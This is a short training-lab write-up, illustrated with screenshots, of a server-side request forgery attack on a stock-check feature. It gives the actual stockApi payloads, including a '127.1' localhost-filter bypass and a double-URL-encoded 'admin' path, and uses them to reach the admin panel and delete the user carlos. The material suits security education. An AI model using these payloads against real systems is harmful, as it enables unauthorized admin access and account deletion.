---
custom_edit_url: null
sidebar_position: 4
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/93e692a4-31ec-47ef-b00a-a8bc5ec5da8e)
</figure>

Let's check out the stock.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/ec3075dd-4054-4fd9-80b8-4cc94cc65c33)
</figure>

We can intercept the request using Burpsuite.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/738c890f-7604-4eb8-89ae-7dc024f6dc81)
</figure>

Let's send the request to the `Repeater`.

We can set the `stockApi` field to the following and send the request:

```
http://localhost/admin
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/2c4dfd87-1fa2-4a4b-a317-c1da7ff2a6ea)
</figure>

So that request is blocked.

Let's send the following request:

```
http://127.1/
```

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/23bc4608-6d58-4b48-a606-715566d2db61)
</figure>

Ah! That returns a valid response.

Let's try visiting the `/admin` page.

```
http://127.1/admin
```

<figure style={{ textAlign: 'center' }}>
![7](https://github.com/Knign/Write-ups/assets/110326359/0cbd23b5-c2fe-4ec0-9773-cfa5d7fa06a2)
</figure>

Looks like the `admin` keyword is being pattern-matched and blocked.

We can get around it by double URL encoding the string.

<figure style={{ textAlign: 'center' }}>
![10](https://github.com/Knign/Write-ups/assets/110326359/95431df0-f4d3-4236-b29c-d4c9557694df)
</figure>

Let's now send the following request:

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

<figure style={{ textAlign: 'center' }}>
![9](https://github.com/Knign/Write-ups/assets/110326359/ae5d389d-3095-4985-8517-6cab343fe83e)
</figure>

We can now delete the `carlos` user.

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

<figure style={{ textAlign: 'center' }}>
![11](https://github.com/Knign/Write-ups/assets/110326359/0eb5aca8-a081-4762-bc3a-a282f5228548)
</figure>

We have solved the lab.

<figure style={{ textAlign: 'center' }}>
![12](https://github.com/Knign/Write-ups/assets/110326359/227c637f-55d5-4f77-bb5b-dbb2578521b8)
</figure>
